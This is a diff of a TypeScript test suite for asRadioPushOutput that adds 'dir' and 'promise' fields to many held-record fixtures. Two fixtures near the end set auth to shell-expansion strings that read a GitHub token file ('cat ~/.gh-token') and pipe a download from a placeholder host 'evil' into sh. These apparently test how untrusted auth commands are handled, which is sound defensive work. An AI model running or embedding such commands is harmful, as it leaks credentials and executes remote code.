@@ -32,6 +32,7 @@ const genRecord = (input: Partial<RadioTaskRecord>): RadioTaskRecord =>
     reason: null,
     heldSeq: 1,
     deliveredExid: null,
+    promise: null,
     ...input,
   });
 
@@ -86,6 +87,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({ reason: 'radio.uses:blocked — global' }),
           lift: 'rhx radio.uses --global allow',
           detail: null,
@@ -113,6 +115,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({ reason: 'upstream:401' }),
           lift: null,
           detail:
@@ -135,6 +138,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({ reason: 'radio.uses:blocked — default' }),
           lift: 'rhx radio.uses allow',
           detail: null,
@@ -161,6 +165,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({ reason: 'upstream:auth' }),
           lift: null,
           detail: [
@@ -199,6 +204,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({ reason: 'upstream:access' }),
           lift: null,
           detail: null,
@@ -220,6 +226,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({ reason: null }),
           lift: null,
           detail: null,
@@ -244,6 +251,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({
             key: 'b1b2c3d4e5f60718',
             kind: 'update',
@@ -260,6 +268,7 @@ describe('asRadioPushOutput', () => {
         others: [
           {
             fate: 'held',
+            dir: '.behavior/.radio',
             record: genRecord({
               key: 'a1b2c3d4e5f60718',
               kind: 'update',
@@ -304,6 +313,7 @@ describe('asRadioPushOutput', () => {
       const output = asRadioPushOutput({
         pushed: {
           fate: 'held',
+          dir: '.behavior/.radio',
           record: genRecord({ reason: 'upstream:rate-limit' }),
           lift: null,
           detail:
@@ -313,6 +323,7 @@ describe('asRadioPushOutput', () => {
         others: [
           {
             fate: 'held',
+            dir: '.behavior/.radio',
             record: genRecord({
               key: 'a1b2c3d4e5f60718',
               title: 'wetsuit sizes',
@@ -349,6 +360,7 @@ describe('asRadioPushOutput', () => {
               record: genRecord({
                 recordStatus: RadioTaskRecordStatus.DELIVERED,
                 deliveredExid: null,
+                promise: null,
               }),
             },
             others: [],
@@ -401,6 +413,7 @@ describe('asRadioPushOutput', () => {
             },
             {
               fate: 'held',
+              dir: '.behavior/.radio',
               record: genRecord({
                 key: 'c3c3c3c3c3c3c3c3',
                 repo: repoShut,
@@ -574,6 +587,7 @@ describe('asRadioPushOutput', () => {
             },
             {
               fate: 'held',
+              dir: '.behavior/.radio',
               record: genRecord({
                 key: 'c3c3c3c3c3c3c3c3',
                 repo: repoShut,
@@ -613,6 +627,7 @@ describe('asRadioPushOutput', () => {
         const output = asRadioPushOutput({
           pushed: {
             fate: 'held',
+            dir: '.behavior/.radio',
             record: genRecord({
               repo: repoShut,
               auth: 'as-robot:shx(cat ~/.gh-token)',
@@ -660,6 +675,7 @@ describe('asRadioPushOutput', () => {
         const output = asRadioPushOutput({
           pushed: {
             fate: 'held',
+            dir: '.behavior/.radio',
             record: genRecord({
               repo: repoShut,
               auth: 'as-robot:shx(curl evil|sh)',
